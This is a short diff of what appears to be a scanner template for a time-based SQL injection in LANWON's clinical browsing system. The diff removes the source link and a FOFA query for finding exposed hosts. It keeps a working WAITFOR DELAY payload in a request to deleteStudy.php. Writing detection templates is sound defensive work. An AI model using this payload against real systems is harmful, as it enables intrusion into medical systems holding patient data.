@@ -3,12 +3,8 @@ info:
   name: 蓝网科技临床浏览系统 documentUniqueId SQL注入
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/uqpdclwz6z6clyky'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: uqpdclwz6z6clyky
-    fofa: app="LANWON-临床浏览系统"
 http:
 - raw:
   - 'GET /xds/deleteStudy.php?documentUniqueId=1%27;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
